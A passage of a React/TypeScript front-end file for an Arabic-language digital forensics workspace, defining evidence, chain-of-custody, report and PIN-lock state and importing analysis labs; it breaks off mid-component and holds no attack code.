/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { 
  Shield, 
  ShieldAlert,
  ShieldCheck,
  Upload, 
  FileSearch, 
  RefreshCw, 
  Download, 
  Sliders, 
  Database, 
  FileText, 
  Zap, 
  AlertTriangle,
  Clipboard,
  Wifi,
  Battery,
  BatteryCharging,
  CheckCircle2,
  Trash2,
  Copy,
  Check,
  Globe,
  Mail,
  Server,
  Lock,
  Key,
  MessageSquare,
  Search,
  LogOut,
  User as UserIcon,
  LayoutDashboard,
  Briefcase,
  Plus,
  History,
  Diff,
  Activity,
  FileCode,
  Sparkles,
  Terminal,
  Hash,
  FileArchive,
  Code,
  AlertOctagon,
  ExternalLink,
  Filter,
  Layers,
  Cloud,
  CloudOff,
  FileCheck,
  ShieldOff,
  X,
  MapPin,
  Camera,
  Clock,
  Printer,
  FileSpreadsheet,
  Smartphone,
  Link,
  Network,
  Cpu,
  LayoutGrid,
  PanelRightClose,
  PanelRightOpen,
  Menu,
  Columns,
  Dices,
  KeyRound,
  FolderArchive,
  Bug,
  FileCheck2,
  Route,
  ScanEye,
  Radar,
  PieChart
} from 'lucide-react';
import {
  LayoutCustomizerDrawer,
  DEFAULT_UI_PREFERENCES,
  NAV_TABS_META,
  renderTabIcon,
  type UiPreferences,
  type AppTabId
} from './components/LayoutCustomizer';
import {
  applyProceduralThemeVariablesToRoot,
  getProceduralThemeById,
  pickRandomProceduralTheme
} from './utils/proceduralThemeEngine';
import {
  DeveloperTelemetryBar,
  type TelemetryLogEntry
} from './components/DeveloperTelemetryBar';
import {
  analyzeFileBinary,
  computeCustodyBlockHash,
  verifyCustodyChainAsync,
  extractIoCsFromLogs,
  parseFullExifMetadata,
  injectRealExifGpsIntoJpeg,
  runCanvasElaAnalysis,
  KNOWN_MAGIC_SIGNATURES,
  formatFileSize,
  type ExtractedIoCRecord,
  type IoCStatsSummary,
  type ChainVerificationResult,
  type IoCType,
  type BinaryInspectionResult,
  type FullExifData,
  type ElaAnalysisResult
} from './utils/forensics';
import {
  analyzeApkBuffer,
  type ApkStaticForensicsResult
} from './utils/apkForensics';
import {
  analyzeSqliteBrowserDatabase,
  type SqliteBrowserForensicsResult
} from './utils/sqliteBrowserForensics';
import {
  deobfuscateScriptPayload,
  type ScriptDeobfuscationResult
} from './utils/scriptDeobfuscator';
import {
  analyzeBinaryDeeply,
  parseHexTextToBytes,
  type BinaryDeepForensicsResult
} from './utils/binaryDeepForensics';
import {
  computeReportSealSha256,
  generateOfficialHtmlReport,
  generateOfficialCsvManifest,
  generateOfficialJsonDossier,
  getClassificationLabel,
  type ReportClassification,
  type ForensicDossierInput
} from './utils/reportGenerator';
import { apiUrl, safeReadJsonResponse } from './utils/apiBase';
import {
  BUILTIN_THREAT_FEEDS_CLIENT,
  syncLiveThreatFeedsClientFallback,
  buildLocalLiveFeedsBriefing,
} from './utils/liveThreatFeedsClient';
import {
  gatherOsintClientFallback,
  buildThreatIntelReportClient,
} from './utils/threatIntelClient';
import { 
  useUpdateChecker, 
  UpdateBanner, 
  UpdateModal, 
  APP_CURRENT_VERSION 
} from './components/UpdateNotification';
import {
  PWAInstallButton,
  OfflineIndicator
} from './components/PWAInstallButton';
import {
  ExportMobilePackageButton,
  MobilePackageExportModal
} from './components/MobilePackageExporter';
import {
  MasterPasswordGate
} from './components/MasterPasswordGate';
import {
  BreachLookupLab,
  ArchiveExtractorLab,
  SslInspectorLab,
  IpGeoThreatMapperLab,
} from './components/SecurityToolkitLabs';
import {
  MalwareHashLookupLab,
  PdfDocumentForensicsLab,
  UrlRedirectTracerLab,
  StegLsbInspectorLab,
} from './components/ForensicDeepLabs';
import {
  CyberTelemetryNetworkDashboard,
  VulnMgmtKevDashboard,
  AssetOsDistributionDashboard,
} from './components/SocDashboardsSuite';
import type { LiveNetworkTelemetry } from './utils/threatIntelServer';

import { 
  auth, 
  db, 
  storage, 
  firebaseConfig,
  PRIMARY_VERCEL_DOMAIN,
  createGoogleAuthProvider,
  verifyAppDomainForGoogleAuth,
  isUsingCustomFirebaseConfig,
  parseFirebaseConfigInput,
  saveCustomFirebaseConfig,
  resetCustomFirebaseConfig,
  signOut, 
  handleFirestoreError, 
  OperationType,
  sendEmailVerification,
  sendPasswordResetEmail,
  updateProfile,
  uploadBytesResumable,
  deleteObject,
  signInWithPopup
} from './firebase';
import { onAuthStateChanged, User } from 'firebase/auth';
import { collection, addDoc, getDocs, query, where, orderBy, limit, Timestamp, doc, getDoc, setDoc, updateDoc, deleteDoc, onSnapshot } from 'firebase/firestore';
import { ref, uploadBytes, getDownloadURL } from 'firebase/storage';
import {
  sanitizeSafeHref,
  isRegexSafe,
  hashPinPbkdf2,
  verifyPinAgainstStoredHash,
  getPinLockoutRemainingSec,
  recordFailedPinAttempt,
  clearPinFailureCounter,
  reportClientSecurityEvent,
  isMasterSessionUnlocked,
  setMasterSessionUnlocked,
} from './utils/clientSecurity';

interface AuditLogEntry {
  id: string;
  timestamp: string;
  fileName: string;
  fileSize: string;
  verdict: string;
  score: number;
  risk: string;
  type?: 'image' | 'clipboard' | 'email';
  sha256: string;
  investigationId?: string;
  synced?: boolean;
}

type ExifData = FullExifData;

interface Investigation {
  id: string;
  title: string;
  status: 'active' | 'archived';
  caseNumber?: string;
  description?: string;
  createdAt: string;
}

interface Evidence {
  id: string;
  fileName: string;
  fileUrl: string;
  storagePath?: string;
  storageStatus?: 'cloud' | 'local';
  fileSize: number;
  mimeType: string;
  sha256: string;
  sha1?: string;
  sha512?: string;
  investigationId: string;
  userId: string;
  analysis: ForensicResult;
  md5?: string;
  createdAt: string;
}

type CustodyActionCategory = 'EVIDENCE_UPLOAD' | 'FILE_INSPECTION' | 'SETTINGS_CHANGE' | 'MANUAL_CUSTODY' | 'REPORT_EXPORT' | 'LOG_ANALYSIS' | 'CASE_MANAGEMENT';

interface SavedForensicReport {
  id: string;
  userId: string;
  investigationId?: string;
  caseNumber: string;
  title: string;
  classification: ReportClassification;
  examinerName: string;
  department?: string;
  summary?: string;
  evidenceCount: number;
  evidenceSha256List?: string[];
  iocCount?: number;
  custodyCount?: number;
  reportSealSha256: string;
  exportFormat?: string;
  createdAt: string;
  synced?: boolean;
}

interface ChainOfCustodyEntry {
  id: string;
  evidenceId: string;
  userId: string;
  officerName?: string;
  actionCategory?: CustodyActionCategory;
  action: string;
  location: string;
  notes: string;
  timestamp: string;
  prevHash?: string;
  recordHash?: string;
  synced?: boolean;
}

interface DashboardStats {
  totalInvestigations: number;
  totalEvidence: number;
  totalLogs: number;
  detectedThreats: number;
  lastUpdated: string;
}

interface UserProfile {
  uid: string;
  email: string;
  displayName: string;
  photoURL?: string;
  role: 'analyst' | 'admin';
  createdAt: string;
  settings?: any;
}

interface ForensicResult {
  fileName: string;
  fileSize: number;
  fileSizeFormatted: string;
  lastModified: string;
  mimeType: string;
  width: number;
  height: number;
  sha256: string;
  sha1: string;
  sha512?: string;
  md5: string;
  hexBytes: string[];
  detectedFileType: string;
  expectedExtensions?: string[];
  exif: ExifData;
  laplacianVariance: number;
  sensorGrainNoise: number;
  elaScore: number;
  aiProbability: number;
  authenticityScore: number;
  verdict: string;
  riskLevel: string;
  localReport: {
    verdict: string;
    riskLevel: string;
    detailedReport: string;
    indicators: string[];
  };
  entropy?: number;
  entropyClassification?: string;
  headerHex?: string;
  headerAscii?: string;
  isMasqueraded?: boolean;
  masqueradeWarning?: string | null;
}

type ExtractedIoC = ExtractedIoCRecord;
type LogParserStats = IoCStatsSummary;

interface ClipboardAnalysis {
  text: string;
  timestamp: string;
  isUrl: boolean;
  threatLevel: 'آمن' | 'مشبوه' | 'خطر';
  analysis: string;
}

interface EmailCheckResult {
  email: string;
  domain: string;
  isDisposable: boolean;
  mxRecordsFound: boolean;
  mxServers: string[];
  domainInfo: string;
  breachStatus: string;
}

interface HeaderAnalysisResult {
  isSpoofed: boolean;
  from: string;
  returnPath: string;
  spf: string;
  dkim: string;
  dmarc: string;
  verdict: string;
}

const getTimeMsSafe = (ts?: string): number => {
  if (!ts) return 0;
  const ms = new Date(ts).getTime();
  return Number.isNaN(ms) ? 0 : ms;
};

const formatTimestampSafe = (ts?: string, mode: 'datetime' | 'time' = 'datetime'): string => {
  if (!ts) return '—';
  const parsed = new Date(ts);
  if (!Number.isNaN(parsed.getTime())) {
    return mode === 'time' ? parsed.toLocaleTimeString('ar-SA') : parsed.toLocaleString('ar-SA');
  }
  return ts;
};

export default function App() {
  const [isMasterUnlocked, setIsMasterUnlocked] = useState<boolean>(() => isMasterSessionUnlocked());

  const handleUnlockMasterSystem = () => {
    setMasterSessionUnlocked(true);
    setIsMasterUnlocked(true);
  };

  const handleLockMasterSystem = () => {
    setMasterSessionUnlocked(false);
    setIsMasterUnlocked(false);
  };

  if (!isMasterUnlocked) {
    return <MasterPasswordGate onUnlock={handleUnlockMasterSystem} />;
  }

  return <SovereignForensicWorkspace onLockSystem={handleLockMasterSystem} />;
}

function SovereignForensicWorkspace({ onLockSystem }: { onLockSystem: () => void }) {
  const update = useUpdateChecker();
  // Cryptographic PBKDF2-HMAC-SHA256 PIN Hasher (with per-PIN CSPRNG salt)
  const hashPin = async (pin: string): Promise<string> => {
    return hashPinPbkdf2(pin);
  };

  // Panic Lock & Auto-Lock State
  const [isLocked, setIsLocked] = useState<boolean>(false);
  const [enteredPin, setEnteredPin] = useState<string>('');
  const [pinError, setPinError] = useState<string | null>(null);

  // First-Time PIN Setup & Change States
  const [setupPin, setSetupPin] = useState<string>('');
  const [confirmPin, setConfirmPin] = useState<string>('');
  const [setupError, setSetupError] = useState<string | null>(null);
  const [isSavingPin, setIsSavingPin] = useState<boolean>(false);
  const [showPinChangeModal, setShowPinChangeModal] = useState<boolean>(false);

  const [activeTab, setActiveTab] = useState<'dashboard' | 'analyzer' | 'apk' | 'browser' | 'threat_intel' | 'deobfuscator' | 'binary_lab' | 'live_feeds' | 'email' | 'clipboard' | 'search' | 'ela' | 'hex' | 'audit' | 'evidence' | 'profile' | 'samples' | 'comparison' | 'custody' | 'parser' | 'reports' | 'breach_lookup' | 'archive_extractor' | 'ssl_inspector' | 'ip_mapper' | 'malware_hash' | 'pdf_forensics' | 'url_tracer' | 'steg_inspector' | 'cyber_telemetry' | 'vuln_kev_dashboard' | 'asset_os_dashboard'>('dashboard');
  const [authReady, setAuthReady] = useState<boolean>(false);
  const [user, setUser] = useState<User | null>(null);
  const [userProfile, setUserProfile] = useState<UserProfile | null>(null);
  const domainVerification = React.useMemo(() => verifyAppDomainForGoogleAuth(), []);

  useEffect(() => {
    if (domainVerification.isLegacyVercelDomain && typeof window !== 'undefined') {
      const targetUrl = `https://${PRIMARY_VERCEL_DOMAIN}${window.location.pathname}${window.location.search}${window.location.hash}`;
      window.location.replace(targetUrl);
    }
  }, [domainVerification.isLegacyVercelDomain]);

  const resolvedUserEmail =
    user?.email ||
    user?.providerData?.find((p) => p.providerId === 'google.com')?.email ||
    userProfile?.email ||
    '';
  const isEmailVerifiedOrGoogle = Boolean(
    user?.emailVerified ||
    user?.providerData?.some((p) => p.providerId === 'google.com')
  );

  useEffect(() => {
    if (!user) return;
    let inactivityTimer: any;
    const resetTimer = () => {
      clearTimeout(inactivityTimer);
      // Auto lock after 3 minutes of inactivity
      inactivityTimer = setTimeout(() => {
        setIsLocked(true);
      }, 3 * 60 * 1000);
    };

    const events = ['mousemove', 'keydown', 'touchstart', 'click', 'scroll'];
    events.forEach(e => window.addEventListener(e, resetTimer));
    resetTimer();

    return () => {
      clearTimeout(inactivityTimer);
      events.forEach(e => window.removeEventListener(e, resetTimer));
    };
  }, [user]);

  const [investigations, setInvestigations] = useState<Investigation[]>(() => {
    try {
      const saved = localStorage.getItem('sovereign_investigations_local');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed)) return parsed;
      }
    } catch (_) {}
    return [];
  });
  const [currentInvestigationId, setCurrentInvestigationId] = useState<string | null>(() => {
    try {
      const saved = localStorage.getItem('sovereign_current_investigation_id');
      if (saved) return saved;
      const invs = JSON.parse(localStorage.getItem('sovereign_investigations_local') || '[]');
      if (Array.isArray(invs) && invs.length > 0) return invs[0].id;
    } catch (_) {}
    return null;
  });

  const changeCurrentInvestigation = (id: string | null) => {
    setCurrentInvestigationId(id);
    if (id) {
      try { localStorage.setItem('sovereign_current_investigation_id', id); } catch (_) {}
    } else {
      try { localStorage.removeItem('sovereign_current_investigation_id'); } catch (_) {}
    }
  };

  const userPinHash = userProfile?.settings?.pinHash || (user?.uid ? localStorage.getItem(`sovereign_pin_${user.uid}`) : null);
  const hasUserPin = Boolean(userPinHash);

  const handleUnlock = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!enteredPin) return;

    if (!userPinHash) {
      setPinError('لم يتم تعيين رمز سري بعد.');
      return;
    }

    const activeUid = user?.uid || 'local';
    const remainingSec = getPinLockoutRemainingSec(activeUid);
    if (remainingSec > 0) {
      setPinError(`تم قفل التحقق مؤقتاً لحماية الحساب بعد محاولات فاشلة متكررة. انتظر ${remainingSec} ثانية.`);
      setEnteredPin('');
      return;
    }

    try {
      const verification = await verifyPinAgainstStoredHash(enteredPin, userPinHash);
      if (verification.valid) {
        clearPinFailureCounter(activeUid);
        setIsLocked(false);
        setEnteredPin('');
        setPinError(null);

        // Seamless upgrade from legacy SHA-256 to PBKDF2-HMAC-SHA256
        if (verification.needsMigrationToPbkdf2 && user) {
          try {
            const upgradedHash = await hashPinPbkdf2(enteredPin);
            localStorage.setItem(`sovereign_pin_${user.uid}`, upgradedHash);
            const updatedSettings = {
              ...(userProfile?.settings || {}),
              pinHash: upgradedHash,
              pinUpdatedAt: new Date().toISOString(),
            };
            setUserProfile((prev) => (prev ? { ...prev, settings: updatedSettings } : null));
            if (auth.currentUser) {
              void updateDoc(doc(db, 'users', auth.currentUser.uid), { settings: updatedSettings }).catch(() => {});
            }
          } catch {}
        }
      } else {
        const failState = recordFailedPinAttempt(activeUid);
        if (failState.lockedSeconds > 0) {
          setPinError(`تم حظر المحاولات لمدة ${failState.lockedSeconds} ثانية بعد ${failState.failedAttempts} محاولات فاشلة.`);
          const tok = auth.currentUser ? await auth.currentUser.getIdToken().catch(() => null) : null;
          void reportClientSecurityEvent({
            eventType: 'CLIENT_PIN_LOCKOUT',
            detail: `Panic Lock PIN temporarily locked after ${failState.failedAttempts} failed attempts`,
            idToken: tok,
          });
        } else {
          setPinError(`رمز PIN غير صحيح (المحاولة ${failState.failedAttempts} من 5 قبل القفل المؤقت).`);
        }
        setEnteredPin('');
      }
    } catch (err) {
      console.error('Unlock error:', err);
      setPinError('حدث خطأ أثناء فحص الرمز السري.');
      setEnteredPin('');
    }
  };

  const handleSaveNewPin = async (e: React.FormEvent) => {
    e.preventDefault();
    setSetupError(null);

    if (setupPin.length < 4 || setupPin.length > 8) {
      setSetupError('يجب أن يتكون رمز PIN من 4 إلى 8 أرقام.');
      return;
    }

    if (setupPin !== confirmPin) {
      setSetupError('رمزي PIN غير متطابقين. يرجى إعادة الإدخال بدقة.');
      return;
    }

    setIsSavingPin(true);
    try {
      const hashed = await hashPin(setupPin);
      const updatedSettings = {
        ...(userProfile?.settings || {}),
        pinHash: hashed,
        pinUpdatedAt: new Date().toISOString()
      };

      if (user) {
        localStorage.setItem(`sovereign_pin_${user.uid}`, hashed);
        if (auth.currentUser) {
          try {
            const profileRef = doc(db, 'users', auth.currentUser.uid);
            const existingSnap = await getDoc(profileRef);
            if (existingSnap.exists()) {
              await updateDoc(profileRef, { settings: updatedSettings });
            } else {
              await setDoc(profileRef, {
                uid: auth.currentUser.uid,
                email: auth.currentUser.email || '',
                displayName: auth.currentUser.displayName || 'محقق سيادي',
                role: 'analyst',
                createdAt: new Date().toISOString(),
                settings: updatedSettings
              });
            }
          } catch (dbErr) {
            console.warn('Firestore PIN update note:', dbErr);
          }
        }
      }

      setUserProfile(prev => prev ? { ...prev, settings: updatedSettings } : null);
      setSetupPin('');
      setConfirmPin('');
      setSetupError(null);
      setShowPinChangeModal(false);
      setIsLocked(false);
      await recordCustodyLedgerBlock(
        `settings-pin-${user?.uid || 'local'}`,
        'SETTINGS_CHANGE',
        hasUserPin ? 'تحديث الرمز السري لقفل الطوارئ (PIN)' : 'تفعيل وتشفير الرمز السري لقفل الطوارئ (PIN)',
        'إعدادات الأمان السيادي - قفل الطوارئ',
        `تم تشفير رمز الحماية بخوارزمية SHA-256 وحفظ التوقيت (${updatedSettings.pinUpdatedAt}).`
      );
    } catch (err) {
      console.error('Save PIN error:', err);
      setSetupError('حدث خطأ أثناء حفظ وتشفير رمز PIN.');
    } finally {
      setIsSavingPin(false);
    }
  };

  const [isCloudAuthenticated, setIsCloudAuthenticated] = useState<boolean>(false);
  const [telemetryLogs, setTelemetryLogs] = useState<TelemetryLogEntry[]>(() => {
    const ts = new Date().toISOString().slice(11, 19);
    return [
      { id: 'init-1', timestamp: ts, subsystem: 'KERNEL', message: 'Kernel Status: Active — Sovereign Core Engine v3.5 initialized', level: 'ok' },
      { id: 'init-2', timestamp: ts, subsystem: 'DAEMON', message: 'Neural-X Security Daemon & Threat Hunting Daemons listening on worker bus', level: 'ok' },
      { id: 'init-3', timestamp: ts, subsystem: 'CRYPTO', message: 'Encryption: AES-256-GCM Active • WebCrypto SHA-256 Chain-of-Custody ready', level: 'ok' },
      { id: 'init-4', timestamp: ts, subsystem: 'PARSER', message: 'Automated Parser Core v3.5 • Memory Cache: Optimized', level: 'info' },
      { id: 'init-5', timestamp: ts, subsystem: 'GATEWAY', message: 'Secured API Gateway Connected • TLS 1.3 telemetry tunnel verified', level: 'ok' },
    ];
  });
  const appendTelemetryLog = (
    subsystem: TelemetryLogEntry['subsystem'],
    message: string,
    level: TelemetryLogEntry['level'] = 'info'
  ) => {
    const ts = new Date().toISOString().slice(11, 19);
    setTelemetryLogs((prev) => [
      { id: `${Date.now()}-${Math.random().toString(36).slice(2, 6)}`, timestamp: ts, subsystem, message, level },
      ...prev.slice(0, 39),
    ]);
  };
  const [statusToast, setStatusToast] = useState<{ message: string; type: 'success' | 'warning' | 'error' } | null>(null);
  const notifyStatus = (message: string, type: 'success' | 'warning' | 'error' = 'success') => {
    setStatusToast({ message, type });
    appendTelemetryLog(
      type === 'error' ? 'DAEMON' : 'KERNEL',
      message,
      type === 'error' || type === 'warning' ? 'warn' : 'ok'
    );
    setTimeout(() => setStatusToast(prev => (prev?.message === message ? null : prev)), 4500);
  };
  const [showNewInvModal, setShowNewInvModal] = useState<boolean>(false);
  const [newInvTitle, setNewInvTitle] = useState<string>('');
  const [newInvCaseNumber, setNewInvCaseNumber] = useState<string>('');
  const [newInvDescription, setNewInvDescription] = useState<string>('');

  // Live DNS & IP Network Telemetry Tool States
  const [threatIntelMode, setThreatIntelMode] = useState<'dns_ip' | 'full_intel'>('dns_ip');
  const [dnsLookupResult, setDnsLookupResult] = useState<LiveNetworkTelemetry | null>(null);
  const [dnsLookupLoading, setDnsLookupLoading] = useState<boolean>(false);
  const [dnsLookupError, setDnsLookupError] = useState<string | null>(null);
  const [isDraggingFile, setIsDraggingFile] = useState<boolean>(false);
  const [isDraggingEvidence, setIsDraggingEvidence] = useState<boolean>(false);
  const [lastAnalyzedEvidenceId, setLastAnalyzedEvidenceId] = useState<string | null>(null);
  const [storageUploadState, setStorageUploadState] = useState<{
    active: boolean;
    fileName: string;
    progress: number;
    bytesTransferred: number;
    totalBytes: number;
    status: 'idle' | 'hashing' | 'uploading' | 'done' | 'error';
    message?: string;
  }>({
    active: false,
    fileName: '',
    progress: 0,
    bytesTransferred: 0,
    totalBytes: 0,
    status: 'idle'
  });
  const [evidenceLocalInspection, setEvidenceLocalInspection] = useState<{
    fileName: string;
    fileSize: number;
    fileSizeFormatted: string;
    mimeType: string;
    binary: BinaryInspectionResult;
    syncedToCloud: boolean;
    fileUrl?: string;
    storagePath?: string;
    evidenceId?: string;
  } | null>(null);
  const [auditSearchQuery, setAuditSearchQuery] = useState<string>('');
  const localFilesCacheRef = React.useRef<Map<string, { blob: Blob; name: string; mimeType: string }>>(new Map());

  const [dashboardStats, setDashboardStats] = useState<DashboardStats>(() => {
    try {
      const cached = localStorage.getItem('sovereign_dashboard_stats');
      if (cached) return JSON.parse(cached);
    } catch (_) {}
    const localEvidence: Evidence[] = (() => {
      try { return JSON.parse(localStorage.getItem('sovereign_evidence_local') || '[]'); } catch { return []; }
    })();
    const localInvs: Investigation[] = (() => {
      try { return JSON.parse(localStorage.getItem('sovereign_investigations_local') || '[]'); } catch { return []; }
    })();
    const localLogs: AuditLogEntry[] = (() => {
      try { return JSON.parse(localStorage.getItem('siyadi_audit_logs') || '[]'); } catch { return []; }
    })();
    const localThreats = localEvidence.filter(
      (e) => (e.analysis?.authenticityScore ?? 100) < 50 || e.analysis?.riskLevel === 'حرج' || e.analysis?.riskLevel === 'مرتفع'
    ).length;
    return {
      totalInvestigations: localInvs.length,
      totalEvidence: localEvidence.length,
      totalLogs: localLogs.length,
      detectedThreats: localThreats,
      lastUpdated: new Date().toISOString()
    };
  });
  const [evidenceList, setEvidenceList] = useState<Evidence[]>(() => {
    try {
      return JSON.parse(localStorage.getItem('sovereign_evidence_local') || '[]');
    } catch {
      return [];
    }
  });
  const [evidenceLoading, setEvidenceLoading] = useState<boolean>(false);
  const [statsLoading, setStatsLoading] = useState<boolean>(false);

  // Authentication State (Mandatory Google Sign-In via Firebase Auth)
  const [authLoading, setAuthLoading] = useState(false);
  const [authError, setAuthError] = useState<string | null>(null);
  const [showCustomFirebasePanel, setShowCustomFirebasePanel] = useState<boolean>(false);
  const [customFirebaseRaw, setCustomFirebaseRaw] = useState<string>('');
  const [customFirebaseError, setCustomFirebaseError] = useState<string | null>(null);
  const [verificationSent, setVerificationSent] = useState(false);

  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const [elaImage, setElaImage] = useState<string | null>(null);
  const [imageName, setImageName] = useState<string>('');
  const [isAnalyzing, setIsAnalyzing] = useState<boolean>(false);
  const [analysisResult, setAnalysisResult] = useState<ForensicResult | null>(null);
  const dedupeAuditLogs = (entries: AuditLogEntry[]): AuditLogEntry[] => {
    const sorted = [...entries].sort(
      (a, b) => getTimeMsSafe(b.timestamp) - getTimeMsSafe(a.timestamp)
    );
    const seenIds = new Set<string>();
    const unique: AuditLogEntry[] = [];
    for (const entry of sorted) {
      const normalizedId = typeof entry?.id === 'string' ? entry.id.trim() : '';
      if (!normalizedId || seenIds.has(normalizedId)) continue;
      seenIds.add(normalizedId);
      unique.push({ ...entry, id: normalizedId });
    }
    return unique;
  };
  const [auditLogs, setAuditLogs] = useState<AuditLogEntry[]>(() => {
    try {
      const raw = JSON.parse(localStorage.getItem('siyadi_audit_logs') || '[]');
      return Array.isArray(raw) ? dedupeAuditLogs(raw) : [];
    } catch {
      return [];
    }
  });
  const auditLogsRef = React.useRef<AuditLogEntry[]>(auditLogs);
  const inFlightFeedEscalationsRef = React.useRef<Set<string>>(new Set());
  useEffect(() => {
    auditLogsRef.current = auditLogs;
  }, [auditLogs]);
  const [elaSlider, setElaSlider] = useState<number>(30);
  const [elaQuality, setElaQuality] = useState<number>(75);
  const [elaMode, setElaMode] = useState<'heatmap' | 'rgb' | 'grayscale'>('heatmap');
  const [elaComparisonPct, setElaComparisonPct] = useState<number>(50);
  const [elaViewLayout, setElaViewLayout] = useState<'split' | 'side-by-side'>('side-by-side');
  const [elaShowHotspots, setElaShowHotspots] = useState<boolean>(true);
  const [elaMetrics, setElaMetrics] = useState<ElaAnalysisResult | null>(null);
  const [copiedHash, setCopiedHash] = useState<string | null>(null);
  const [showPrintModal, setShowPrintModal] = useState<boolean>(false);
  const [comparisonItems, setComparisonItems] = useState<{ a: Evidence | null, b: Evidence | null }>({ a: null, b: null });

  // Official Documented Forensic Report Center States
  const [savedReports, setSavedReports] = useState<SavedForensicReport[]>(() => {
    try {
      return JSON.parse(localStorage.getItem('sovereign_forensic_reports') || '[]');
    } catch {
      return [];
    }
  });
  const [reportCaseNumber, setReportCaseNumber] = useState<string>(() => `SOV-CASE-${new Date().getFullYear()}-${String(Math.floor(1000 + Math.random() * 9000))}`);
  const [reportTitle, setReportTitle] = useState<string>('التقرير الجنائي الرقمي الموحد وتوثيق بصمات الأدلة');
  const [reportClassification, setReportClassification] = useState<ReportClassification>('CONFIDENTIAL');
  const [reportDepartment, setReportDepartment] = useState<string>('وحدة الأدلة الجنائية الرقمية السيادية (SOC Forensics Lab)');
  const [reportExaminerName, setReportExaminerName] = useState<string>('');
  const [reportSummary, setReportSummary] = useState<string>('تم فحص الأدلة الرقمية المدرجة أدناه وحساب بصماتها التشفيرية SHA-256 والتحقق من ترويساتها الثنائية (Magic Bytes) وسلامة سلسلة الحيازة عبر مختبر المنصة السيادية.');
  const [reportSelectedEvidenceIds, setReportSelectedEvidenceIds] = useState<string[]>([]);
  const [reportIncludeEvidenceHashes, setReportIncludeEvidenceHashes] = useState<boolean>(true);
  const [reportIncludeExifEla, setReportIncludeExifEla] = useState<boolean>(true);
  const [reportIncludeCustodyChain, setReportIncludeCustodyChain] = useState<boolean>(true);
  const [reportIncludeIoCs, setReportIncludeIoCs] = useState<boolean>(true);
  const [reportLastSealSha256, setReportLastSealSha256] = useState<string | null>(null);
  const [isGeneratingReport, setIsGeneratingReport] = useState<boolean>(false);

  const [custodyHistory, setCustodyHistory] = useState<ChainOfCustodyEntry[]>([]);
  const [custodyVerification, setCustodyVerification] = useState<ChainVerificationResult>({ verified: true, count: 0, status: 'empty' });
  const [globalCustodyLedger, setGlobalCustodyLedger] = useState<ChainOfCustodyEntry[]>(() => {
    try {
      return JSON.parse(localStorage.getItem('sovereign_global_custody_ledger') || '[]');
    } catch {
      return [];
    }
  });
  const [globalLedgerVerification, setGlobalLedgerVerification] = useState<ChainVerificationResult>({ verified: true, count: 0, status: 'empty' });
  const [custodyViewMode, setCustodyViewMode] = useState<'global' | 'evidence'>('global');
  const [custodyCategoryFilter, setCustodyCategoryFilter] = useState<'ALL' | CustodyActionCategory>('ALL');
  const [selectedEvidenceForHistory, setSelectedEvidenceForHistory] = useState<string | null>(null);
  const [showAddCustodyModal, setShowAddCustodyModal] = useState<boolean>(false);
  const [custodyModalScope, setCustodyModalScope] = useState<'evidence' | 'global'>('evidence');
  const [custodyForm, setCustodyForm] = useState<{ action: string; location: string; notes: string; officerName: string }>({
    action: 'فحص البصمات والترويسة Magic Bytes',
    location: 'مختبر الأدلة الرقمية السيادي - محطة SOC-01',
    notes: '',
    officerName: ''
  });
  const [isAddingCustody, setIsAddingCustody] = useState<boolean>(false);
  const [showCustodyCertificate, setShowCustodyCertificate] = useState<boolean>(false);
  const custodyWriteQueueRef = React.useRef<Promise<void>>(Promise.resolve());
  const latestLedgerHashRef = React.useRef<string>('');
  const evidenceCustodyQueueRef = React.useRef<Promise<void>>(Promise.resolve());
  const evidenceCustodyTipRef = React.useRef<Map<string, string>>(new Map());

  // Real Regex Log Parser & IoC Extractor States
  const [logInputText, setLogInputText] = useState<string>('');
  const [parsedIoCs, setParsedIoCs] = useState<ExtractedIoC[]>([]);
  const [logParserStats, setLogParserStats] = useState<LogParserStats | null>(null);
  const [activeIoCFilter, setActiveIoCFilter] = useState<'all' | 'ipv4' | 'ipv6' | 'domain' | 'url' | 'email' | 'hash' | 'cve' | 'exploit' | 'artifact'>('all');
  const [iocSearchQuery, setIocSearchQuery] = useState<string>('');
  const [isParsingLogs, setIsParsingLogs] = useState<boolean>(false);
  const [liveAutoParseLogs, setLiveAutoParseLogs] = useState<boolean>(true);
  const [logViewFormat, setLogViewFormat] = useState<'table' | 'cards'>('table');
  const [customRegexPattern, setCustomRegexPattern] = useState<string>('\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b');
  const [customRegexFlags, setCustomRegexFlags] = useState<string>('gi');
  const [customRegexError, setCustomRegexError] = useState<string | null>(null);
  const [customRegexMatches, setCustomRegexMatches] = useState<{ value: string; line: number }[]>([]);
  const [showHighlightedLogs, setShowHighlightedLogs] = useState<boolean>(false);

  // Interactive Hex Viewer & Magic Bytes Reader States (up to 4KB local inspection)
  const [hexInspectorData, setHexInspectorData] = useState<{
    fileName: string;
    totalBytes: number;
    bytes: string[];
    headerHex: string;
    headerAscii: string;
    detectedFileType: string;
    expectedExtensions: string[];
    entropy: number;
    entropyClassification: string;
    isMasqueraded: boolean;
    masqueradeWarning: string | null;
  } | null>(null);
  const [hexSelectedByteIndex, setHexSelectedByteIndex] = useState<number | null>(null);
  const [hexSearchQuery, setHexSearchQuery] = useState<string>('');
  const [hexPageOffset, setHexPageOffset] = useState<number>(0);
  const [isDraggingHex, setIsDraggingHex] = useState<boolean>(false);
  const [isDraggingEla, setIsDraggingEla] = useState<boolean>(false);

  // Real Device Telemetry (Battery & Network)
  const [batteryInfo, setBatteryInfo] = useState<{ level: number; charging: boolean }>({ level: 100, charging: true });
  const [networkInfo, setNetworkInfo] = useState<{ online: boolean; type: string; downlink: string }>({
    online: navigator.onLine,
    type: (navigator as any).connection?.effectiveType || '4g',
    downlink: (navigator as any).connection?.downlink ? `${(navigator as any).connection.downlink} Mbps` : 'سريع'
  });

  // Clipboard analysis state
  const [clipboardResult, setClipboardResult] = useState<ClipboardAnalysis | null>(null);
  const [clipboardLoading, setClipboardLoading] = useState<boolean>(false);

  // Email Forensic States
  const [targetEmail, setTargetEmail] = useState<string>('');
  const [emailCheckResult, setEmailCheckResult] = useState<EmailCheckResult | null>(null);
  const [emailLoading, setEmailLoading] = useState<boolean>(false);

  const [emailHeaderInput, setEmailHeaderInput] = useState<string>('');
  const [headerResult, setHeaderResult] = useState<HeaderAnalysisResult | null>(null);



  // Android APK Forensics States
